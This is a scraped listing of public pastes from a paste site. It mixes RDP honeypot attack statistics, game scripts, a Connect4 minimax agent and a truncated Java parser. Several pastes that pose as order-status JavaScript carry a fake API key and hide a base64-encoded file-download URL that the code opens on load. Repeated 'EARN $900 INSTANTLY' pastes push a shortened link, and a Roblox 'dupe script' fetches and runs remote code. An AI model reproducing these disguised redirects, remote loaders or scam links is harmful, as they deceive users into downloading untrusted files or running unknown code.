id,title,username,language,date,content
L1kj0TNt,2025-04-01_stats.json,rdp_snitch,JSON,Wednesday 2nd of April 2025 07:18:33 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 36498,
    ""146.190.105.191"": 2469,
    ""138.199.24.6"": 67059,
    ""156.146.57.52"": 9153,
    ""156.146.57.120"": 9156,
    ""150.95.89.149"": 9135,
    ""156.146.57.174"": 9156,
    ""106.14.144.233"": 429,
    ""185.42.12.5"": 18,
    ""217.160.21.137"": 6,
    ""188.166.250.11"": 6,
    ""198.235.24.244"": 9,
    ""165.140.242.48"": 3,
    ""82.202.249.174"": 3,
    ""194.180.49.123"": 3,
    ""36.140.131.209"": 3,
    ""147.182.229.114"": 336,
    ""205.210.31.64"": 9,
    ""157.245.104.150"": 3,
    ""194.165.16.162"": 6,
    ""206.189.41.239"": 3,
    ""194.165.16.167"": 6,
    ""91.103.143.74"": 3,
    ""92.255.57.11"": 6,
    ""58.218.199.219"": 12,
    ""61.219.85.85"": 3,
    ""20.106.194.122"": 12,
    ""198.235.24.35"": 9,
    ""152.42.181.151"": 18,
    ""159.223.65.65"": 9,
    ""165.154.36.177"": 3,
    ""92.255.85.59"": 6,
    ""92.255.57.86"": 6,
    ""185.7.214.81"": 3,
    ""205.210.31.67"": 9
  },
  ""asn"": {
    ""AS212238"": 63963,
    ""AS14061"": 2844,
    ""AS60068"": 67059,
    ""AS135161"": 9135,
    ""AS37963"": 429,
    ""AS59425"": 18,
    ""AS8560"": 6,
    ""AS396982"": 36,
    ""AS203380"": 3,
    ""AS49505"": 3,
    ""AS201814"": 3,
    ""AS9808"": 3,
    ""AS48721"": 12,
    ""AS3170"": 3,
    ""AS207566"": 21,
    ""AS4134"": 12,
    ""AS3462"": 3,
    ""AS8075"": 12,
    ""AS135377"": 3
  },
  ""isp"": {
    ""Datacamp Limited"": 63963,
    ""DigitalOcean, LLC"": 2844,
    ""DataCamp Limited"": 67059,
    ""GMO-Z.COM PTE. LTD."": 9135,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Chang Way Technologies Co. Limited"": 39,
    ""IONOS SE"": 6,
    ""Google LLC"": 36,
    ""DA International Group Ltd."": 3,
    ""JSC Selectel"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""China Mobile"": 3,
    ""Flyservers S.A."": 12,
    ""VeloxServ Communications Ltd"": 3,
    ""Chinanet"": 12,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Microsoft Corporation"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Datacamp Limited"": 63963,
    ""DigitalOcean, LLC"": 2820,
    ""Cdn77 SGP"": 67059,
    ""Zcom Thai"": 9135,
    ""Aliyun Computing Co., LTD"": 429,
    ""Horizon LLC"": 18,
    ""Unknown"": 9,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""AlphaVPS LLC"": 3,
    ""HostSlick"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Flyservers S.A"": 12,
    ""UAB \""Tarapa\"""": 3,
    ""Chang Way Technologies Co. Limited"": 21,
    ""Chinanet JS"": 12,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Microsoft Azure Cloud (eastus)"": 12,
    ""Digital Ocean"": 18,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""North West"": 131022,
    ""South West"": 2505,
    ""Tokyo"": 9135,
    ""Shanghai"": 429,
    ""Moscow"": 39,
    ""Madrid"": 6,
    ""California"": 375,
    ""New York"": 3,
    ""St.-Petersburg"": 3,
    ""Bavaria"": 3,
    ""Guangdong"": 3,
    ""Karnataka"": 3,
    ""Kaunas"": 12,
    ""England"": 3,
    ""Jiangsu"": 12,
    ""New Taipei City"": 3,
    ""Virginia"": 12
  },
  ""country"": {
    ""Singapore"": 133527,
    ""Japan"": 9135,
    ""China"": 444,
    ""Russia"": 42,
    ""Spain"": 6,
    ""United States"": 390,
    ""Germany"": 3,
    ""India"": 3,
    ""Lithuania"": 12,
    ""United Kingdom"": 3,
    ""Taiwan"": 3
  },
  ""account"": {
    ""hello"": 143472,
    ""Test"": 24,
    ""qvlaCjUsI"": 3,
    ""fNnAPM"": 3,
    ""kHeRpN"": 3,
    ""(empty)"": 6,
    ""rIIYhfZsB"": 3,
    ""NhSgjP"": 3,
    ""SsrrMF"": 3,
    ""Administr"": 21,
    ""shnHlTxOg"": 3,
    ""Gydyzg"": 3,
    ""gSITpL"": 3,
    ""Domain"": 6,
    ""Administrator"": 3,
    ""FQEXQyCCE"": 3,
    ""DwsDzr"": 3,
    ""PtKMzQ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 143568
  },
  ""client_build"": {
    ""Unknown"": 143568
  },
  ""client_name"": {
    ""Unknown"": 143568
  },
  ""ip_type"": {
    ""hosting & proxy"": 134259,
    ""hosting"": 9234,
    ""proxy"": 51,
    ""Unknown"": 21,
    ""mobile"": 3
  }
}"
Miae9FU9,2025-04-01_stats.json,rdp_snitch,JSON,Wednesday 2nd of April 2025 07:16:30 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 36496,
    ""146.190.105.191"": 2468,
    ""138.199.24.6"": 67055,
    ""156.146.57.52"": 9152,
    ""156.146.57.120"": 9156,
    ""150.95.89.149"": 9135,
    ""156.146.57.174"": 9156,
    ""106.14.144.233"": 429,
    ""185.42.12.5"": 18,
    ""217.160.21.137"": 6,
    ""188.166.250.11"": 6,
    ""198.235.24.244"": 9,
    ""165.140.242.48"": 3,
    ""82.202.249.174"": 3,
    ""194.180.49.123"": 3,
    ""36.140.131.209"": 3,
    ""147.182.229.114"": 336,
    ""205.210.31.64"": 9,
    ""157.245.104.150"": 3,
    ""194.165.16.162"": 6,
    ""206.189.41.239"": 3,
    ""194.165.16.167"": 6,
    ""91.103.143.74"": 3,
    ""92.255.57.11"": 6,
    ""58.218.199.219"": 12,
    ""61.219.85.85"": 3,
    ""20.106.194.122"": 12,
    ""198.235.24.35"": 9,
    ""152.42.181.151"": 18,
    ""159.223.65.65"": 9,
    ""165.154.36.177"": 3,
    ""92.255.85.59"": 6,
    ""92.255.57.86"": 6,
    ""185.7.214.81"": 3,
    ""205.210.31.67"": 9
  },
  ""asn"": {
    ""AS212238"": 63960,
    ""AS14061"": 2843,
    ""AS60068"": 67055,
    ""AS135161"": 9135,
    ""AS37963"": 429,
    ""AS59425"": 18,
    ""AS8560"": 6,
    ""AS396982"": 36,
    ""AS203380"": 3,
    ""AS49505"": 3,
    ""AS201814"": 3,
    ""AS9808"": 3,
    ""AS48721"": 12,
    ""AS3170"": 3,
    ""AS207566"": 21,
    ""AS4134"": 12,
    ""AS3462"": 3,
    ""AS8075"": 12,
    ""AS135377"": 3
  },
  ""isp"": {
    ""Datacamp Limited"": 63960,
    ""DigitalOcean, LLC"": 2843,
    ""DataCamp Limited"": 67055,
    ""GMO-Z.COM PTE. LTD."": 9135,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Chang Way Technologies Co. Limited"": 39,
    ""IONOS SE"": 6,
    ""Google LLC"": 36,
    ""DA International Group Ltd."": 3,
    ""JSC Selectel"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""China Mobile"": 3,
    ""Flyservers S.A."": 12,
    ""VeloxServ Communications Ltd"": 3,
    ""Chinanet"": 12,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Microsoft Corporation"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Datacamp Limited"": 63960,
    ""DigitalOcean, LLC"": 2819,
    ""Cdn77 SGP"": 67055,
    ""Zcom Thai"": 9135,
    ""Aliyun Computing Co., LTD"": 429,
    ""Horizon LLC"": 18,
    ""Unknown"": 9,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""AlphaVPS LLC"": 3,
    ""HostSlick"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Flyservers S.A"": 12,
    ""UAB \""Tarapa\"""": 3,
    ""Chang Way Technologies Co. Limited"": 21,
    ""Chinanet JS"": 12,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Microsoft Azure Cloud (eastus)"": 12,
    ""Digital Ocean"": 18,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""North West"": 131015,
    ""South West"": 2504,
    ""Tokyo"": 9135,
    ""Shanghai"": 429,
    ""Moscow"": 39,
    ""Madrid"": 6,
    ""California"": 375,
    ""New York"": 3,
    ""St.-Petersburg"": 3,
    ""Bavaria"": 3,
    ""Guangdong"": 3,
    ""Karnataka"": 3,
    ""Kaunas"": 12,
    ""England"": 3,
    ""Jiangsu"": 12,
    ""New Taipei City"": 3,
    ""Virginia"": 12
  },
  ""country"": {
    ""Singapore"": 133519,
    ""Japan"": 9135,
    ""China"": 444,
    ""Russia"": 42,
    ""Spain"": 6,
    ""United States"": 390,
    ""Germany"": 3,
    ""India"": 3,
    ""Lithuania"": 12,
    ""United Kingdom"": 3,
    ""Taiwan"": 3
  },
  ""account"": {
    ""hello"": 143464,
    ""Test"": 24,
    ""qvlaCjUsI"": 3,
    ""fNnAPM"": 3,
    ""kHeRpN"": 3,
    ""(empty)"": 6,
    ""rIIYhfZsB"": 3,
    ""NhSgjP"": 3,
    ""SsrrMF"": 3,
    ""Administr"": 21,
    ""shnHlTxOg"": 3,
    ""Gydyzg"": 3,
    ""gSITpL"": 3,
    ""Domain"": 6,
    ""Administrator"": 3,
    ""FQEXQyCCE"": 3,
    ""DwsDzr"": 3,
    ""PtKMzQ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 143560
  },
  ""client_build"": {
    ""Unknown"": 143560
  },
  ""client_name"": {
    ""Unknown"": 143560
  },
  ""ip_type"": {
    ""hosting & proxy"": 134251,
    ""hosting"": 9234,
    ""proxy"": 51,
    ""Unknown"": 21,
    ""mobile"": 3
  }
}"
kzMJjAnC,2025-04-01_stats.json,rdp_snitch,JSON,Wednesday 2nd of April 2025 07:15:17 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 36494,
    ""146.190.105.191"": 2467,
    ""138.199.24.6"": 67051,
    ""156.146.57.52"": 9151,
    ""156.146.57.120"": 9156,
    ""150.95.89.149"": 9135,
    ""156.146.57.174"": 9156,
    ""106.14.144.233"": 429,
    ""185.42.12.5"": 18,
    ""217.160.21.137"": 6,
    ""188.166.250.11"": 6,
    ""198.235.24.244"": 9,
    ""165.140.242.48"": 3,
    ""82.202.249.174"": 3,
    ""194.180.49.123"": 3,
    ""36.140.131.209"": 3,
    ""147.182.229.114"": 336,
    ""205.210.31.64"": 9,
    ""157.245.104.150"": 3,
    ""194.165.16.162"": 6,
    ""206.189.41.239"": 3,
    ""194.165.16.167"": 6,
    ""91.103.143.74"": 3,
    ""92.255.57.11"": 6,
    ""58.218.199.219"": 12,
    ""61.219.85.85"": 3,
    ""20.106.194.122"": 12,
    ""198.235.24.35"": 9,
    ""152.42.181.151"": 18,
    ""159.223.65.65"": 9,
    ""165.154.36.177"": 3,
    ""92.255.85.59"": 6,
    ""92.255.57.86"": 6,
    ""185.7.214.81"": 3,
    ""205.210.31.67"": 9
  },
  ""asn"": {
    ""AS212238"": 63957,
    ""AS14061"": 2842,
    ""AS60068"": 67051,
    ""AS135161"": 9135,
    ""AS37963"": 429,
    ""AS59425"": 18,
    ""AS8560"": 6,
    ""AS396982"": 36,
    ""AS203380"": 3,
    ""AS49505"": 3,
    ""AS201814"": 3,
    ""AS9808"": 3,
    ""AS48721"": 12,
    ""AS3170"": 3,
    ""AS207566"": 21,
    ""AS4134"": 12,
    ""AS3462"": 3,
    ""AS8075"": 12,
    ""AS135377"": 3
  },
  ""isp"": {
    ""Datacamp Limited"": 63957,
    ""DigitalOcean, LLC"": 2842,
    ""DataCamp Limited"": 67051,
    ""GMO-Z.COM PTE. LTD."": 9135,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Chang Way Technologies Co. Limited"": 39,
    ""IONOS SE"": 6,
    ""Google LLC"": 36,
    ""DA International Group Ltd."": 3,
    ""JSC Selectel"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""China Mobile"": 3,
    ""Flyservers S.A."": 12,
    ""VeloxServ Communications Ltd"": 3,
    ""Chinanet"": 12,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Microsoft Corporation"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Datacamp Limited"": 63957,
    ""DigitalOcean, LLC"": 2818,
    ""Cdn77 SGP"": 67051,
    ""Zcom Thai"": 9135,
    ""Aliyun Computing Co., LTD"": 429,
    ""Horizon LLC"": 18,
    ""Unknown"": 9,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""AlphaVPS LLC"": 3,
    ""HostSlick"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Flyservers S.A"": 12,
    ""UAB \""Tarapa\"""": 3,
    ""Chang Way Technologies Co. Limited"": 21,
    ""Chinanet JS"": 12,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Microsoft Azure Cloud (eastus)"": 12,
    ""Digital Ocean"": 18,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""North West"": 131008,
    ""South West"": 2503,
    ""Tokyo"": 9135,
    ""Shanghai"": 429,
    ""Moscow"": 39,
    ""Madrid"": 6,
    ""California"": 375,
    ""New York"": 3,
    ""St.-Petersburg"": 3,
    ""Bavaria"": 3,
    ""Guangdong"": 3,
    ""Karnataka"": 3,
    ""Kaunas"": 12,
    ""England"": 3,
    ""Jiangsu"": 12,
    ""New Taipei City"": 3,
    ""Virginia"": 12
  },
  ""country"": {
    ""Singapore"": 133511,
    ""Japan"": 9135,
    ""China"": 444,
    ""Russia"": 42,
    ""Spain"": 6,
    ""United States"": 390,
    ""Germany"": 3,
    ""India"": 3,
    ""Lithuania"": 12,
    ""United Kingdom"": 3,
    ""Taiwan"": 3
  },
  ""account"": {
    ""hello"": 143456,
    ""Test"": 24,
    ""qvlaCjUsI"": 3,
    ""fNnAPM"": 3,
    ""kHeRpN"": 3,
    ""(empty)"": 6,
    ""rIIYhfZsB"": 3,
    ""NhSgjP"": 3,
    ""SsrrMF"": 3,
    ""Administr"": 21,
    ""shnHlTxOg"": 3,
    ""Gydyzg"": 3,
    ""gSITpL"": 3,
    ""Domain"": 6,
    ""Administrator"": 3,
    ""FQEXQyCCE"": 3,
    ""DwsDzr"": 3,
    ""PtKMzQ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 143552
  },
  ""client_build"": {
    ""Unknown"": 143552
  },
  ""client_name"": {
    ""Unknown"": 143552
  },
  ""ip_type"": {
    ""hosting & proxy"": 134243,
    ""hosting"": 9234,
    ""proxy"": 51,
    ""Unknown"": 21,
    ""mobile"": 3
  }
}"
SK1a6zGh,Market.js,WassupDog45,JavaScript,Wednesday 2nd of April 2025 07:12:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/313/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xC2mMqiX,EARN $900 INSTANTLY 2025 BT,junaanims,JavaScript,Wednesday 2nd of April 2025 07:05:49 PM CDT," 
Pdf https://tinyurl.com/methodssss


At8i5s8txT
"
usefivmP,Untitled,WassupDog45,JavaScript,Wednesday 2nd of April 2025 06:57:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/214/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LZnZ1FjY,EARN $900 INSTANTLY 2025 BT,christopfchristiaans,JavaScript,Wednesday 2nd of April 2025 06:48:14 PM CDT," 
Pdf https://tinyurl.com/methodssss


s5srCedpWY
"
w4FZiKN9,Products.js,WassupDog45,JavaScript,Wednesday 2nd of April 2025 06:42:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/976/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rXY8z9de,Random Gmail Acc 1A,christopfchristiaans,JavaScript,Wednesday 2nd of April 2025 06:32:19 PM CDT," 
Pdf https://tinyurl.com/methodssss


HR76oJjhK1
"
0t05B30J,Roblox Be a silly seal automatic reel script,evannik23,Lua,Wednesday 2nd of April 2025 05:48:39 PM CDT,"local plr = game.Players.LocalPlayer
local PlayerUi = plr.PlayerGui
local Backpack = plr.Backpack
local Char = plr.Character
local FishingRod = Char:FindFirstChild(""Fishing Rod"") or Backpack:FindFirstChild(""Fishing Rod"")
local Deployed = FishingRod.Vars.IsDeployed
local FishingUI = plr.PlayerGui:WaitForChild(""FishingGameUI"")
local Prompt = FishingUI.CatchBar.ClickPrompt
local Mouse = plr:GetMouse()
if getgenv().Connections==nil then
    getgenv().Connections={}
    else
        for _,Connection in pairs(getgenv().Connections) do 
            Connection:Disconnect()
        end 
        getgenv().Connections={}
    end
    
function AddConnection(connection)
    table.insert(getgenv().Connections,connection)
end
function ActivateReelLogic()

    if FishingUI.Enabled == false then return end
    if Prompt.Text == ""Press & Hold"" then
        wait(0.5)
        mouse1press()
    else
        mouse1release()
        while task.wait() do
            if Prompt.Text == ""Press & Hold"" then break end
            mouse1click()
        end
    end
end
AddConnection(Prompt:GetPropertyChangedSignal(""Text""):Connect(ActivateReelLogic))
AddConnection(FishingUI:GetPropertyChangedSignal(""Enabled""):Connect(function() 
     if FishingUI.Enabled == false then mouse1release() wait(0.5) mouse1click() return end
     ActivateReelLogic()
end))
AddConnection(Deployed:GetPropertyChangedSignal(""Value""):Connect(function()
    if Deployed.Value == false then return end
    while wait(0.1) do
        if FishingUI.Enabled == true then break end
        mouse1click()
    end
end))"
y7TgQMdT,Products.js,WassupDog45,JavaScript,Wednesday 2nd of April 2025 05:40:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/669/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WDB04tiz,Ps99 Dupe Script and autofarm,ok76777,Lua,Wednesday 2nd of April 2025 05:27:20 PM CDT,"loadstring(game:HttpGet(""https://pastefy.app/SG6a1K7k/raw""))()"
025XdPVY,Order.js,WassupDog45,JavaScript,Wednesday 2nd of April 2025 05:24:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/904/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
s4Nr0ymi,si3,pierdziadek,Python,Wednesday 2nd of April 2025 05:13:58 PM CDT,"import copy
import random

from exceptions import AgentException

class MinMaxAgent:
    def __init__(self, my_token='o'):
        self.my_token = my_token

    def decide(self, connect4):
        if connect4.who_moves != self.my_token:
            raise AgentException('not my round')
        
        score, best_drop = self.minimax(connect4, 5, connect4.who_moves)
        if best_drop is None:
            return random.choice(connect4.possible_drops())
        return best_drop

    def minimax(self, connect4, depth, who_moves):
        if depth == 0:
            return 0, None
        if who_moves != connect4.who_moves:
            raise AgentException('not my round')
            
        score = -999
        best_drop = None
        for possible_drop in connect4.possible_drops():
            plansza_testowa = copy.deepcopy(connect4)
            plansza_testowa.drop_token(possible_drop)
            if plansza_testowa.game_over:
                if plansza_testowa.wins == who_moves:
                    return 1, possible_drop
            new_score, new_best_drop = self.minimax(plansza_testowa, depth - 1, 'o' if who_moves == 'x' else 'x')
            new_score *= -1
            if new_score > score:
                score = new_score
                best_drop = possible_drop
        return score, best_drop







import copy
import random

from exceptions import AgentException


class AlphaBetaAgent:
    def __init__(self, my_token='o'):
        self.my_token = my_token

    def decide(self, connect4):
        if connect4.who_moves != self.my_token:
            raise AgentException('not my round')
        
        score, best_drop = self.alphabeta(connect4, 5, connect4.who_moves, -999, 999)
        if best_drop is None:
            return random.choice(connect4.possible_drops())
        return best_drop

    def alphabeta(self, connect4, depth, who_moves, alpha, beta):
        if depth == 0:
            return 0, None
        if who_moves != connect4.who_moves:
            raise AgentException('not my round')
            
        score = -999
        best_drop = None
        for possible_drop in connect4.possible_drops():
            plansza_testowa = copy.deepcopy(connect4)
            plansza_testowa.drop_token(possible_drop)
            if plansza_testowa.game_over:
                if plansza_testowa.wins == who_moves:
                    return 1, possible_drop
            new_score, new_best_drop = self.alphabeta(plansza_testowa, depth - 1, 'o' if who_moves == 'x' else 'x', -beta, -alpha)
            new_score *= -1

            if new_score > score:
                score = new_score
                best_drop = possible_drop

            alpha = max(alpha, score)

            if alpha >= beta:
                break
        return score, best_drop

"
h2HDaRW3,Untitled,WassupDog45,JavaScript,Wednesday 2nd of April 2025 04:53:35 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/856/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bEV8s3Ai,turtle test,Incomprehensible,Lua,Wednesday 2nd of April 2025 04:30:47 PM CDT,"local width = 3
local length = 3
local depth = 4

--- MOVEMENT / DIG FUNCS
function tryMove()
	--try move
	local couldMove, moveReason = turtle.forward()
	if(couldMove == false) then
		print(moveReason)
		return false
	end
	return true
end

function tryDig()
	--detect if solid block
	if(turtle.detect()) then
		--try dig
		local couldDig, digReason = turtle.dig()
		if(couldDig == false) then
			--print(digReason)
			return false
		end
		return true
	end
	return true
end

function tryDigAndMoveDown()
	if(turtle.detectDown()) then
		local couldDig, digReason = turtle.digDown()
		if(couldDig == false) then
			print(digReason)
		end
	end
	turtle.down()
end

function tryDigAndMoveUp()
	if(turtle.detectUp()) then
		local couldDig, digReason = turtle.digUp()
		if(couldDig == false) then
			print(digReason)
		end
	end
	turtle.up()
end

function tryDigAndMove()
	tryDig()
	tryMove()
end
--- MAIN USER INPUT

write(""The miner will make a cube shaped quarry of depth (Y): "")
depth = read()

write(""Starting from right of this block, the width of the quarry (X): "")
width = read()

write(""Looking directly forwards, the length of the quarry will be (Z): "")
length = read()
print(""(Width: "".. width .. "", Depth: "" .. depth .. "", Length: "" .. length .. "")"")

--- MAIN PREMINING CHECKS
local fuelLevel = turtle.getFuelLevel()
print(""Fuel level: "".. fuelLevel)

if(fuelLevel <= 1000) then
	--select slot 16, used for fuel
	turtle.select(16)
	
	print(textutils.serialise(turtle.getItemDetail()))
	
	local ok, err = turtle.refuel()
	if ok then
		local newFuellevel = turtle.getFuelLevel()
		print((""Refuelled %d, current level is %d""):format(newFuellevel - fuelLevel, newFuellevel))
	else
		printError(err)
	end
end
turtle.select(1)

-- MAIN MOVEMENT

local sleepTime = 0.3
local invertTurn = -1
for z = 0,depth-1,1 do
	tryDigAndMoveDown()
	--sleep(sleepTime)
	for x = 0, width-1, 1 do
		--sleep(sleepTime)
		for y = 0, length-1, 1 do
			tryDigAndMove()
			--sleep(sleepTime)
		end
		
		if(x ~= width-1) then
			if(invertTurn == -1) then
				turtle.turnRight()
				tryDigAndMove()
				turtle.turnRight()
			end
			if(invertTurn == 1) then
				turtle.turnLeft()
				tryDigAndMove()
				turtle.turnLeft()
			end
			invertTurn = invertTurn*-1
			
		end
		
	end
	turtle.turnRight()
	turtle.turnRight()
end


-- try to go back up
for rise = 1, depth,1 do
	tryDigAndMoveUp()
end"
5CiMZpey,blorkx,SforzandoCF,Java,Wednesday 2nd of April 2025 03:48:03 PM CDT,"package com.sforzando.jscratch2;

public class BlockReader {
    public void read (JSONObject input, ScratchProject project, ScratchTarget target) {
        String[] ids = new String[input.length()];
        Object[] jblocks = new Object[input.length()];
        Iterator<String> keys = input.keySet().iterator();
        {
            int keysI = 0;
            while (keys.hasNext()) {
                ids[keysI] = keys.next();
                jblocks[keysI] = input.get(ids[keysI]);
                keysI++;
            }
        }
        ScratchBlock[] blocks = new ScratchBlock[jblocks.length];
        for (int i = 0; i < ids.length; i++)
            blocks[i] = parseBlock(jblocks[i], project, target);
        target.addBlocks(blocks);
    }
    
    public static ScratchBlock parseBlock (Object o, ScratchProject project, ScratchTarget target) {
            if (o instanceof JSONArray) {
                JSONArray array = (JSONArray) o;
